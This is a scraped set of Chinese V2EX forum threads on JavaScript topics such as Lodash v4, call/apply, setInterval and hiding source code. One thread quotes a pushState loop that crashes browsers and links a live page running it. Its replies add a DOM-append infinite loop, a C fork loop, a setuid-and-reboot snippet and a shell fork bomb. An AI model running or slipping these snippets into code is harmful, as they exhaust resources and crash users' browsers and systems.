：百毒管理层和运营确实厚颜无耻唯利是图，吃香极其难看，但是大量没有决策权的技术人员是无辜的，何况当中一些人对业界做出开源贡献，很多人的逻辑就是爹是强奸犯，儿子也得枪毙", " 现有版本非常稳定。\r", "如果需要定制功能也是自己进行二次开发，总不能要求开发团队为你一个人服务对吧？", " 我纯粹是从用户角度来考虑的，因为这些技术人员没有决策权所以这个产品可能说停就停，不能因为技术人员无辜去使用而不考虑风险。", "百度做出来的东西 Mac 下滚动一如既往地烂 ╮(╯▽╰)╭……", "楼上说百度怎么样的小伙伴有一点没有明确，百度发展成什么样，不是程序员决定的，是高层所谓的大股东决定的。\r", "平心而论，我一个前端知识基本为 0 的数据开发，也在 30 分钟内利用 Echarts 画出了几个像样的图表，单凭这一点，我就觉得百度的技术积累挺深厚的。\r", "\r", "PS ：\r", "顺便推广下我用 Echarts 做的一个小工具，分析 Chrome 历史浏览记录\r", "百度的 zrender, echarts 这些东西还是很好用的", " 看头像这么眼熟，原来是抓到煦神了", " 你的 history 还挺好玩。。我装了", " 难道是 jiangzheng ？我的头像都是统一的，比较好认", "我只想说，文档终于学了下 Highcharts ，非常容易读了！！\r", "之前的版本我就是因为看不下眼文档所以放弃了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre>Function.prototype.toString = function () { return \"[native code]\" }\n</pre></div>\n\n<p>这样当用户调用 <code>functionA.toString()</code> 的时候就看不到源码了。</p>\n\n<p>各位高手帮忙 review 下，看看有没有漏洞。</p>\n</div></div>"], "reply": "19", "tittle": "[Javascript] Javascript 源码保护的一个办法", "comment": ["详细方法可以参考这个贴子：\r", "\r", "无法保护", "能执行，就能解密...", "想多了，下发到客户端的 JavaScript 代码防不了破解，只能增加破解成本", "自欺欺人的感觉……", "...难道别人看你代码是通过 toString ？", "这不自欺欺人么", "前端何苦难为前端...", "用 scala.js, 或者 clojurescript 试试看. 编译后的代码太好看了", " 貌似后端转前端的才会不想代码被看到。\r", "曾问个同项目的后端同学看看他的后端代码，好交流一下怎么前后端协作分工，他绕着弯说不能给。\r", "\r", "前端加密目前都只是增加解密成本，做到混淆精简这一步就足够阻止无心人阅读了，但防不了有心人解密。\r", " 这帖 letv 那个代码自带解密方法，纯属吓唬非前端。", "其实没人想过做个类似 VProtect 那样的虚拟机壳么？", " VMProtect, 另外一楼的链接中也有人提到了。", "其实我一直在考虑用 emscripten ……\r", "\r", "然后用 C++写前端……", " 同感。。。", "别的思路我不知道，不过把那你们的代码写的自己都看不懂，就相当于加密了...", "楼主试试这个\r", "\r", "完全没用\r", "\r", "就连楼主认为的“防止在控制台打印函数源码”的用都没有\r", "\r", " ", "dart2js", "悲剧啊~~~\r", "\r", "前端代码怎么保护起来？特别是现在像基于 JS 的客户端开发逐渐增多的情况下。\r", "\r", "大家可以看一下『蜻蜓 FM 』作弊的事情，就知道为什么要加密代码了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>例如对 String 添加 reverse 方法，一般是这样写：<br>\n<code><br>\nString.prototype.reverse = function() {<br>\n        return Array.prototype.reverse.apply(this.split(\"\")).join();<br>\n}<br>\n</code><br>\n可不可以这样写：<br>\n<code><br>\nString.prototype.reverse = function() {<br>\n        return this.split(\"\").reverse().join();<br>\n}<br>\n</code></p>\n\n<p><strong>上面的写法比下面的写法有什么好处呢？</strong></p>\n</div></div>"], "reply": "21", "tittle": "JavaScript 中使用 Call 或 Apply 扩展的好处是什么？", "comment": ["String 通过 apply 或 call  借用 Array 的 reverse 实现方法", "为了写起来方便，自由度更大。比如 func.apply(null, arguments)，改变 this ，使用 arguments ，还有 Array.prototype.slice.call(arguments)，强行调用其他对象的方法，\r", "\r", "另外的区别就是 apply 比 call 慢， call 比直接调用慢， bind 方法比这些都慢\r", "另外， string 的 reverse 方法，用 for 循环比这两个都快\r", "另外， join 方法不带参数默认使用逗号作为分隔符", "1 是指定 this\r", "2 是有些情况，比如类数组对象，根本就没有 reverse 这个方法可以调用，只能通过借用 Array 的方法来实现", "感觉在 LZ 给的例子里，完全没必要用 Array.prototype.reverse.call\r", "倒是像这样的场景可能需要：\r", "str = \"Hello world!\"\r", "Array.prototype.slice.call(str, 1, 3).join('')\r", "> \"el\"", "1 。想改变 this 时\r", "2 。例如想遍历 NodeList 时用 Array.prototype.forEach.call\r", "3 。用 arguments 时配合 apply", "楼主给的例子里上面写法没什么用..", "最主要就是改变调用栈。不过如果用了框架比如 jquery.proxy, _.bind 之类的封装就可以不需要用 apply call 了，一般来说。原生党比较最爱。", "复用", " @", " @", " 谢谢！", " 谢谢！", " @", " Sorry ，我例子的问题，怪不得看了半天没看出明显的差异！", " 谢谢！", " 考虑的很仔细，多谢！", "apply 能用数组的形式给函数传参，这个特性很有用的。\r", "有些人设计的函数是这样的\r", "`function (arg1, arg2, arg3, ...) {  }`\r", "参数数量不限，但是必须一个一个写。如果你的参数是从其他地方以数组的形式过来的，那用 apply 就很方便了。", "改变内部 this ，做工具库经常用的 ，有一个特别常用的，将 NodeList 转化为数组\r", "\r", "Array.prototype.silce.call(document.querySelector('.item'))\r", "\r", "用 new Array 创建性能更好，就是代码多点", "所以楼上各位大大，楼主列举的那两种写法，到底上面那种好在哪里呢？", " 其实这种场景也可以直接 #String.slice 的 :-)", " \r", "\r", "没好处", " 列举的两个例子不好，可以参考 @", " 的例子研究一下。。。", " 我的例子也不好， @", " 说得对，在新标准里 String 已经有 slice 方法了…不过你可以当他没有 hhhh", " 列举的例子不好，主要是 String 调用 split 后正好是数组了，所以正好可以使用 reverse 方法；而在正常情况下，一个类型 A 是没有直接的转换的方法可以转换为类型 B 的，所以在 A 使用 B 的方法时，使用：\r", "B.prototype.method.apply(A, arguments);"]},
{"content": ["<div class=\"topic_content\">抱歉，知乎复制出来再改格式太麻烦了，请移步知乎专栏读：\r<br><a target=\"_blank\" href=\"http://zhuanlan.zhihu.com/jswebdev/20524618\" rel=\"nofollow\">http://zhuanlan.zhihu.com/jswebdev/20524618</a>\r<br>\r<br>以后我尽量首发 V2EX</div>"], "reply": "5", "tittle": "我目前（ 2016 初）对 isomorphic web app 的态度", "comment": ["meteor 呢？", "有 JavaScript 黑名单制和白名单制 都是很正常的浏览行为", "哦", "  Say No to Universal Apps\r", " 这篇文章我也看了，说的不是同一个事情，我是说服务器浏览器同构，他是说多客户端同构"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>2015 年对 Lodash 来说是很赞的一年。</p>\n\n<p>Lodash 成为了 <a target=\"_blank\" rel=\"nofollow\" href=\"https://gist.github.com/anvaka/8e8fa57c7ee1350e3491#file-01-most-dependent-upon-md\">npm 依赖最多的包</a>，多达<a target=\"_blank\" rel=\"nofollow\" href=\"http://npm-stat.com/charts.html?package=&amp;author=jdalton\">十亿次</a>的下载次数， v3 版本已经广泛的使用了！</p>\n\n<p><img src=\"http://7d9mkd.com1.z0.glb.clouddn.com/lodash4-intro-1.png\" alt=\"\"></p>\n\n<p>在 2016 与 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/lodash/lodash/wiki/Changelog#v400\">lodash v4.0.0</a>，我们想要摆脱束缚，更进一步！</p>\n\n<h2>仅限于现代化</h2>\n\n<p>在 v4 在 中我们将会更新<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/lodash-archive\">旧项目</a> &amp; 运行环境 &amp; <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.microsoft.com/en-us/WindowsForBusiness/End-of-IE-support\">最低支持  IE &lt; 9</a>！</p>\n\n<h2>4 kB 的核心</h2>\n\n<p>Lodash 的大小会随着时间继续增长，新的方法 &amp; 功能的增加，无论如何，我们依然保持 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/lodash/lodash/tree/4.0.0/dist\">4 kB (gzipped)</a> 的核心构建。兼容 Backbone v1.2.4 和 不喜欢累赘的朋友。</p>\n\n<h2>更多的 ES6+</h2>\n\n<p>在 v4 中增加了支持：拷贝 &amp; 比较 maps, sets, &amp; symbols, 比较 array buffers, 转换 iterators 到 arrays, &amp; Lodash itself, _(...), is an iterable.</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/lodash/lodash/tree/4.0.0-es/\">继续拥抱 ES6+</a>，增加类似：<em>.isSafeInteger, _.isSymbol, &amp;</em>.toInteger &amp; 重命名方法 trimLeft 到 trimStart 的方法。</p>\n\n<h2>更多模块化</h2>\n\n<p>突击测试！ 📣</p>\n\n<p>bindAll 是属于哪个的分类？</p>\n\n<p>A) require('lodash/function/bindAll')<br>\nB) function('lodash/utility/bindAll')<br>\nC) require('lodash/util/bindAll')</p>\n\n<p>不知道？没关系，在 v4 中已经无所谓了，现在的模块路径变得简单了：</p>\n\n<p><code>var bindAll = require('lodash/bindAll');</code></p>\n\n<p>我们让最小化构建变得简单，协助了类似 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/caolan/async/pull/996\">Async</a> &amp; <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/rackt/redux/pull/611\">Redux</a> 容易使用 lodash ！</p>\n\n<h2>一等的 FP(函数式编程)</h2>\n\n<p>在 v3 中 我们引入了 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/lodash-archive/lodash-fp\">lodash-fp</a>。我们学到了很多，并决定纳入 v4 的核心中。</p>\n\n<p>现在你可以容易的 get immutable iteratee-first, data-last auto-curried methods ：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">_</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'lodash/fp'</span><span class=\"p\">);</span>\n<span class=\"kd\">var</span> <span class=\"nx\">object</span> <span class=\"o\">=</span> <span class=\"p\">{</span> <span class=\"s1\">'a'</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"p\">};</span>\n<span class=\"kd\">var</span> <span class=\"nx\">source</span> <span class=\"o\">=</span> <span class=\"p\">{</span> <span class=\"s1\">'b'</span><span class=\"o\">:</span> <span class=\"mi\">2</span> <span class=\"p\">};</span>\n<span class=\"kd\">var</span> <span class=\"nx\">newObject</span> <span class=\"o\">=</span> <span class=\"nx\">_</span><span class=\"p\">.</span><span class=\"nx\">assign</span><span class=\"p\">(</span><span class=\"nx\">source</span><span class=\"p\">)(</span><span class=\"nx\">object</span><span class=\"p\">);</span>\n\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">newObject</span><span class=\"p\">);</span>\n<span class=\"c1\">// =&gt; { 'a': 1, 'b': 2 }</span>\n\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">object</span><span class=\"p\">);</span>\n<span class=\"c1\">// =&gt; { 'a': 1 }</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">convert</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'lodash/fp/convert'</span><span class=\"p\">);</span>\n<span class=\"kd\">var</span> <span class=\"nx\">assign</span> <span class=\"o\">=</span> <span class=\"nx\">convert</span><span class=\"p\">(</span><span class=\"s1\">'assign'</span><span class=\"p\">,</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'lodash.assign'</span><span class=\"p\">));</span>\n<span class=\"c1\">// 一样有效!</span>\n</pre></div>\n\n<h2>Chakra 优化</h2>\n\n<p>事实上，我们对 <a target=\"_blank\" rel=\"nofollow\" href=\"https://blogs.windows.com/msedgedev/2015/12/05/open-source-chakra-core/\">Chakra 非常感兴趣</a>， Lodash 是对<strong>所有引擎</strong>优化的。不同于很多库，我们不喜欢单引擎，所以无论你使用的是什么引擎依然都有很好的性能。</p>\n\n<p>在 v4 中，我们继续承诺扩展性能支持惰性计算 &amp; 提高例如循环引用这样的核心功能的性能。</p>\n\n<h2>Emojis</h2>\n\n<p>更上一个档次， Lodash v4 支持了 emojis ！包括：<br>\nastral symbols, unicode modifiers, variation selector characters, zero-width joiners, &amp; regional indicator symbols.</p>\n\n<p><img src=\"http://7d9mkd.com1.z0.glb.clouddn.com/lodash4-intro-2.png\" alt=\"\"></p>\n\n<h2>重大变化</h2>\n\n<p>我们在这个版本中做了很多改进，所以请记得看 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/lodash/lodash/wiki/Changelog#compatibility-warnings\">changelog</a>。以及提供了 <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.npmjs.com/package/lodash-migrate\">lodash-migrate</a> (即将发布) 方便更新到最新版本。</p>\n\n<p>要是你喜欢 lodash v4 ，别忘了 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/lodash/lodash/stargazers\">star the repo</a> 或者 npm star lodash ！</p>\n\n<h2>中文文档</h2>\n\n<p>最后楼主在之前就在翻译中文文档 <a target=\"_blank\" rel=\"nofollow\" href=\"http://lodash.think2011.net/\">http://lodash.think2011.net</a>，会在近期内翻译完成与官方同步，有任何疑问和意见非常在站内留言！;-)</p>\n</div></div>"], "reply": "9", "tittle": "Lodash4 正式版发布了！以及提前翻译的中文文档", "comment": ["\"最低支持 IE < 9\" -- 所以是 IE 全滋瓷了?", "good 。搭车送一篇之前翻译的文章《如何百倍加速 Lo-Dash ？引入惰性计算》 ", " 已收藏！😄", " 原文是说， 4 版本后将会和老版本的 lodash 和老的运行环境分开了，而且 4 版本放弃对 IE9 以下的老版本的支持。", "应该是 IE > 9 吧", " @", " 是的，抱歉，我弄错了。", "我想了解一下移除 thisArg 的支持，干脆不兼容对应的 native 方法，是出于什么考虑，我在 Issue 中也没搜到相应的讨论", "记的有个 lodash 和 underscore 合并的项目，不知道进展怎么样了。", "这贴刚发的时候进来看过，只知道有 Underscroe ，然后就被 Chakra ， ES 6 ，模块化吓跑了。\r", "\r", "最近在看函数式编程的书提到了 Lodash ，就来 V 站搜了一下关键字，又看到了这帖，哈哈。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>官网的 api 也是看的太糟心了，不知道有没有遇到过类似问题的同学？怎么解决的？</p>\n</div></div>"], "reply": "5", "tittle": "有没有比较了解 DataTable 的，数字按照字符串的类型进行排序很诡异啊", "comment": ["数字的大小的比较或排序，是右“对齐”的方式。而字符串是左对齐，把数字变成字符串排序，得变成一样的长度 ，然后左边位不够的补 0", " 默认的只有字符串排序吗？数字排序都必须要转换成字符串排序？", "\r", "可以指定排序类型，看第一个“ How to use ”下面的部分", "可以先转成 Number, or 通过 render 动态去转 ", "\r", "\r", "col.render = function(cell, type, row){\r", "  if(type === 'sort'){\r", "    return Number(cell);\r", "  }\r", "  return cell;\r", "}", " 谢谢，已经找到问题所在了，，，，， json 数据丢失了，导致本应该 float 的地方出现了 NaN 和 undefined ，就变成字符串的排序了。。醉了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在开发者头条上看到一个 iOS 版的<a target=\"_blank\" rel=\"nofollow\" href=\"http://toutiao.io/posts/o6c3dx\">波浪进度指示器</a>，拿 js 仿写了一个：<br>\n代码：<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/newraina/waveLoading.js\">Github</a><br>\n演示：<a target=\"_blank\" rel=\"nofollow\" href=\"http://newraina.github.io/waveLoading.js/demo/\">demo</a><br>\n<img src=\"https://raw.githubusercontent.com/newraina/waveLoading.js/master/demo/DEMO.gif\" alt=\"\"><br>\n学 js 没有多久，有需要改进的地方还望大家多多批评建议！</p>\n</div></div>"], "reply": "11", "tittle": "新人练手：波浪进度指示器", "comment": ["棒棒哒 ：)", "不赖！", "强迫症表示无法接受这一点瑕疵：\r", "激动人心啊，楼上是我第一次贴图成功", " 谢谢！已修复~ 有些小问题已经发现了但还不知道原因，比如下面的外框总要粗一点...", "挺不错，除了圆边感觉问题很多啊\r", "\r", "是不是网页版演示可以让人拖那个进度条会更好些", " @", " 谢谢两位~", " ", "\r", "头条上似乎就是这个~", " 已修改，现在可以手动拖也可以自动演示，圆边的问题还在找原因~", " 我看的是 iOS 版的...看来最近都喜欢搞这个", "下圆边模糊的问题已修复~原因是 canvas 线宽引起的坐标不准"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这样写是没问题的:<br>\n<code><br>\nvar num = 3<br>\nresult = window.setInterval(function(i = num) {<br>\n  console.log(i)<br>\n}, 1000)<br>\n</code></p>\n\n<p>这样写在 FireFox 中 setInterval 只执行了一次:<br>\n<code><br>\nvar num = 3<br>\nvar printText = function(i = 4) {<br>\n  console.log(i)<br>\n}<br>\nresult = window.setInterval(printText(num), 1000)<br>\n</code></p>\n</div></div>"], "reply": "5", "tittle": "setInterval(func, delay) 中 func 该如何写才有效?", "comment": ["这不是很明显么?\r", "\r", "result = window.setInterval(printText(num), 1000)\r", "你直接调用了 printText 一次 而不是让 setInterval 去调用\r", "\r", "result = window.setInterval(printText, 1000) 这样才对啊", "如果想要传参进去可以弄个闭包：\r", "\r", "var num = 3\r", "var printText = function(i = 4) {\r", "return function() {\r", "console.log(i)\r", "}\r", "}\r", "result = window.setInterval(printText(num), 1000)", "如果你非要这么调用，那么就\r", "result = window.setInterval(function(){printText(num)}, 1000)", "基本常识, 以前一直忽略...\r", "第一个参数是函数，不是函数的返回值。。。当然如果函数的返回值也是一个函数是没问题的\r", "你第二种写法`setInterval(print(num),300)`相当于把 print(num)的返回值传给了 setInterval 。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前知道 JS 能全站开发（包括数据库）就已经很震惊了。</p>\n\n<p>今天看到一个基于 JavaScript 的操作系统我去</p>\n\n<p>链接： <a target=\"_blank\" rel=\"nofollow\" href=\"https://linux.cn/article-6931-1.html\">https://linux.cn/article-6931-1.html</a></p>\n</div></div>"], "reply": "29", "tittle": "基于 JavaScript 的操作系统，地球人已经阻止不了 JavaScript 了", "comment": ["这么浮夸的说法只能给 JS 招黑…\r", "而且更何况这根本不是什么操作系统，只是模拟了个操作系统而已", "……这个有点儿重复造轮子的感觉……", "程序猿总是热衷于重复发明轮子", " ", "应该说是 NodeUI ？。。。", "既然是操作系统，首先就得跟操作系统平起平坐吧，哪有在人家操作系统上运行的操作系统……不说别的，直接操作个 AX 寄存器试试……", "求不黑我们", "见过 js 实现计算机硬件的。\r", "浏览器上的虚拟机，可跑 linux 。", "叫 Node 桌面还差不多", "这。。", " are you sure?", "甲骨文表示现在还没到收割的时候", " 请问关甲骨文什么事。。。", " @", " ", "deepin 的桌面不是就曾经用的 html+js 么…", "NodeOS 官网明确说了，‘ node-os is a full operating system built on top of the linux kernel ’\r", "Operating System 和 Operating Kernel 还是有区别的，\r", "楼上各位看清再喷", "你看看你们有多弱，因为人家造的一个玩具而撕逼。", "Android 是不是操作系统？？？它可是跑在 Linux 之上的。。", "不能做任何事的语言能称作一个语言？\r", "就好比说，哇法语居然能表达这种意思，法语真是太强大了！", "手里有一把称心锤子,然后就觉得全世界所有的问题都钉子,都想用自己手里的这把锤子去敲打敲打.\r", "\r", "笑死我了.", " 莫要谎，莫要着急。安卓也是基于 Linux 内核开发的一款应用于手机端的系统，它也被称为系统了。想想当当初安卓这么个情况下起步，估计也是被喷了一大堆，淡然看待，理性接受，有何问题呢？万一它真的起来了呢", " 安卓可以安装软件 ， JavaScript 可以，秀逗了。", " 照官网这么说是可以装软件的啊", "作为一门孕期只有 7 天的语言, 发展到今天的程度真是令人惊叹,惊叹,惊叹", " \r", "文章不是说可以通过 npm 安装软件吗？？都好几十万个了。。。", " \r", "而且我那个回复也并不是要挺 NodeOS ，，我只是想说明，不能因为 NodeOS 是跑在 Linux 之上的就说它不是操作系统，，这根本站不住脚。。 Android 就是最好的反例", "为什么人家自己造了一个玩具都能让两帮人撕起逼来？ 这是有多弱啊……", " \r", "\r", "Android 不是反例，归根到底 Android 就是一个 Linux 操作系统的一个分支，和桌面用的是不同的 GUI 而已。", " \r", "这点上我和你看法不同，我认为 Android 不是 Linux 分支， Android 除了内核和驱动用了 Linux 的东西，其他跟 Linux 没啥关系，，不管是从开发、编程的角度，还是从用户使用的角度上， Android 和 Linux 的不同点要比相同点多，，\r", "\r", "比如 Python 没法在 Android 上用，有的只是个残废的专门移植的版本， Tkinter 、 wxPython 、 PyQt 这些能在 Linux 、 Windows 上跑的 Python 库一个都不能在 Android 上跑，， numpy 、 scipy 、 matplotlib 、 pandas 这一堆 Python 的库也完全不能用。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>RT 昨天在网上看到的这样几行 JavaScript 代码，觉得很神奇啊，有没有大神解释一下。</p>\n\n<p>完整 HTML 代码如下：<br>\n&lt;html&gt;<br>\n&lt;body&gt;<br>\n&lt;script&gt;<br>\nvar total=\"\";<br>\nfor (var i=0;i&lt;1000000;i++)<br>\n{<br>\n    total= total+i.toString ();<br>\n    history.pushState (0,0,total);<br>\n}<br>\n&lt;/script&gt;<br>\n&lt;/body&gt;<br>\n&lt;/html&gt;</p>\n\n<p>慎点： <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.ipis.com.cn/tetst.html\">http://www.ipis.com.cn/tetst.html</a></p>\n</div></div>"], "reply": "27", "tittle": "12 行 javascript 代码能让浏览器崩溃 iPhone 自动重启", "comment": ["执行 100W 次呗", "不断的把越来越长的字符串添加到历史记录里，浏览器占用内存也越来越大，就卡死了呗", " 正解", "听说三行代码搞崩浏览器？\r", "\r", "\r", "while(true) {\r", "  document.appendChild(document.createElement(\"div\"));\r", "}", " 手误了，\r", "\r", "while(true) { \r", "document.body.appendChild(document.createElement(\"div\")); \r", "}", "Mac 下实测， CPU 飙升，温度飙升， chrome 卡死。", " ", "Firefox 直接提示脚本正忙", "Chrome 使用了 3.5G 内存，然后内存爆表，然后 Chrome 自动重启", " \r", "活捉 /w\\", "已把网址设置为书签，以后不用按两个键去重启了~", "chrome 才吃了 2G 多内存就崩溃了 没劲", "chrome 内存 3400M 后死掉重启，", " 噢？ 怎么又活抓我了。", "1 行 C 代码能让操作系统内核崩溃\r", "RT 昨天在网上看到的这样 1 行 C 代码，觉得很神奇啊，有没有大神解释一下。\r", "\r", "完整 C 代码如下：\r", "while(true){ fork() }\r", "\r", "\r", "2 行 C 代码能让操作系统重启\r", "RT 昨天在网上看到的这样 2 行 C 代码，觉得很神奇啊，有没有大神解释一下。\r", "\r", "完整 C 代码如下：\r", "setuid(0);\r", "reboot(RB_POWER_OFF);", " 还要 create ，何不直接 append body", " 看错了。抱歉", "_='_';while(_=_+_){history.pushState(0,0,_)}", "_='_';while(_+=_){history.pushState(0,0,_)}", "这有啥好试的，搞个循环吃内存嘛", "  \r", " ", "  \r", " ", "  \r", "Edge 浏览器， 20s 内运行完，内存占用不超过 100M 。", " edge 本来就不支持该函数", "是时候 @一下 fork 炸弹了\r", "\r", ":(){ :|:& };:", " ", "\r", "支持的\r", "只是 edge 的实现没有 webkit 系那么耗资源， 1000000 次跑完了。", " 好像微软家要在 head 里做特殊处理才支持？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>var a=document.getElementById(\"xxxx\")<br>\n会将该对象的基址带入，修改 a 寄等于修改 id=xxxx 的元素<br>\n怎么去掉这种连带呢?</p>\n</div></div>", "<div class=\"topic_content\">2 小时前已经解决了，谢谢。</div>"], "reply": "10", "tittle": "javascript 如何进行不带基址的赋值", "comment": ["0", "说实话，看不懂。\r", "\r", "你的意思是修改 a 的属性会修改这个元素？\r", "\r", "这个有什么问题么?", "楼主你是想问怎么 clone/copy 一个 object 吧，看到个基址吓死我以为 javascript 能直接当汇编用。。", " 嗯呢，不知道怎么形容", " 我想修改 a 但不修改该元素", " 非常感谢", "a.cloneNode()", "补充一下， cloneNode 有参数的，如果是 true 就会克隆其节点以及节点下面的内容。", "学习一下对象的深复制和浅复制。", "var a = document.getElementById(\"xxxx\")\r", "\r", "a.bbb = 'ccc' // 会修改 #xxxx 元素的 bbb 成员\r", "a = 123 // 对 #xxxx 不会有任何影响"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>找找文档，应该是 this.parentNode.previousSibling<br>\n但是返回的不是对象而是 text...<br>\n怎么获取父节点的上一兄弟节点呢</p>\n</div></div>"], "reply": "8", "tittle": "如何获取父节点的上一兄弟节点", "comment": ["0", "previousElementSibling 而不是 previousSibling", "Notes\r", "Gecko-based browsers insert text nodes into a document to represent whitespace in the source markup. Therefore a node obtained, for example, using Node.firstChild or Node.previousSibling may refer to a whitespace text node rather than the actual element the author intended to get.\r", "\r", "See Whitespace in the DOM and W3C DOM 3 FAQ: Why are some Text nodes empty? for more information.", " 非常感谢", "mark", " \r", "对于不支持 previousElementSibling 的浏览器。循环获取 previousSibling ，直到其 nodeType 为 1", "我只想问为什么要用裴博士作为头像", " 当初要传头像，刚好这张图片"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://made.withflash.net/2016/01/17/wtf-is-web-development/\" rel=\"nofollow\">http://made.withflash.net/2016/01/17/wtf-is-web-development/</a>\r<br>\r<br>最近郁闷着准备找新工作，充电之余写了点牢骚话\r<br>某些术语用得不太准确，请无视\r<br>因为个人涉足的领域有限，可能某些地方理解较肤浅，比较主观\r<br>但我不是来伤害某些人的感情的，欢迎评论及提 issue</div>", "<div class=\"topic_content\">我认为技术应该要越来越易用，如果技术难用，创意就难实现，如此而已。\r<br>我不是跟大家争论语言问题，不是想引战。</div>", "<div class=\"topic_content\">看了评论，我想到自己写的时候没提及到的是开发人员的“两极分化”，不过要涉及到心理的东西，还是不要扯的太远好了 不太懂</div>"], "reply": "73", "tittle": "分享本人对 Web 前端开发的看法，比较偏门的视角", "comment": ["flash 漏洞百出 各种本地 io  浏览器沙箱模型碰到它基本就成摆设了 我真不知道 adobe 一家之力是怎么让 flash 活过来的还活得这么好\r", "\r", "另外你要是黑任何一门语言都有理由 比如：\r", "\r", "php 的特性坑和标准库坑太多\r", "py 版本分裂\r", "java 语法冗长 标准库接口设计反人类\r", "c#生态不好 社区太少遇到问题只能找微软\r", "c++的模板可读性差编译效率低下\r", "c 语言字符串处理弱 轮子少需要手写数据结构 posix api 还不兼容\r", "\r", "等等等等。。。", " 我没打算黑语言。你说 Flash 漏洞百出，你也可以套到任何一个软件上面。因为 Adobe 有做工作，所以 Flash 能活", "确实理解得比较肤浅，而且很主观~", " 从安全中心收到 issue 的数量来看， flash 漏洞的确要多很多。况且 flash 是跟 jvm 一样的平台级的东西，如果 jvm 隔几天就报一个安全问题，你怎么看？", " 我理解你的意思就是说，漏洞百出的技术就渣，完毕。没有 HTML5 之前，大家要做网页应用是怎么做的？ Java 也有因漏洞问题被屏蔽过的历史，而且大苹果也有份", "支持楼主的想法。有不一样的意见挺好。\r", "我也认为前端在工程化上走火入魔，而忽视从产品和用户的角度发现／解决问题。", " 谢谢。 这里还有一篇老外写的 ", "好吧。那就忽略你黑 js 的那些话。其实我觉得 js 是个尝试，现在有太多的基于继承的 OO 语言（也就是狭义上的 OO ）， js 是个异类，换个口味，不是很好嘛。虽然 js 有些东西的确很渣，但起码是一次尝试，值得鼓励。\r", "\r", "前端 mvc 实际上就是把 b/s 写成 c/s 。模板的组装是肯定要有的，你不在前端组装就在后端组装，工作量是一样的。在前端组装就省了服务端的部分压力。而且这样一来服务端就只需要提供 json 形式的接口，假如以后要开发移动端，后端也不需要变任何东西。", "本来的 Web 是为了呈现内容，现在硬是做成 App 了。", " 我觉得只是为了呈现内容的话，发明电视就够了，没必要有计算机。计算机就是为了交互而生的。\r", "\r", "\r", " 简直黑没黑到点子上。 node.js 的最大黑点就是单线程异步模型。如果把它托管给 apache 或者 nginx ，然后应用这边就相当于是同步的了，代码逻辑也能理顺。作者却拿 node 的包说事，好像 python 写个什么东西都不需要包似的。", "我赞同撸主的看法，现在的 JS 和几年前的 AS3 很像。\r", "\r", "AS3 让一大波做动画的华丽变身成程序员，拿着超高的薪水，每天制造着垃圾代码。\r", "\r", "现在的 NodeJS 出现让一大波做网页的华丽变身成后端工程师，甚至架构师，还是一样拿着超高的薪水，制造着垃圾产品。\r", "\r", "我不针对 AS3 JS 或 NodeJS ，技术无罪。但是我鄙视那些趁火打劫，拉低整个程序员职业社会地位的乐色。\r", "\r", "libuv 你吃透了么？ epoll iocp select 等 io 模型理解了么？", "不是每个公司都会专门去招一个 C++码猴去改 Webkit 核心与网页内容交互", "可以说我是第一个把新技术带给现在所在的公司的前端，在这之前他们是无法想象让自家的网页版应用与系统整合完成一些特殊的功能的", "入门成本低确实会带出来很多只会写 jQuery 的人，但是也不能因此觉得 Web 技术不能做 App 吧，一个人也可以搞定一个网站+客户端了，哪里不好呢？", "如果你是觉得前端写不好代码，那么写后端的大牛还是不要碰界面相关的东西了，审美那么差，写什么界面，难用的要死", "\r", "English !\r", "\r", "单页应用能减少页面跳转，这一点就让体验上升了一个层次。\r", "至于弄丢了的历史记录，加个 route 记录管理就好了。\r", "\r", "web 页面的基础是浏览器， App 的基础是 OS ， web 前端所做的这一切工作是为了使 web 体验更接近 App ，并超越 App(无需安装，兼容多平台)。\r", "说了这么多，怎么实现呢？只有 HTML 、 CSS 、 JavaScript 可以实现上述需求。\r", "\r", "“什么都用 JavaScript 去解决问题”，因为“制作 App 不再需要懂 Java 或者 Objective-C/Swift 了”。\r", "“也就是说 JavaScript 要升级了”，因为需求膨胀了。", " ![]( ", ")\r", "English!", " ![]( ", ")\r", "发不了图-_-||", "这个语言一直这样，上限特别高，下限特别低，只不过现在用的人更多了，玩的花样也更多了。\r", "最近又重温了一下老道的演讲 ", " \r", "只能说讲的实在太好了", "那堆东西确实搞起来好麻烦啊，两者比较我宁愿去用 swift 写原生的", "感觉像是把英文那篇的观点复述了一遍，而且理解还比人家浅...", " 说得对， Web 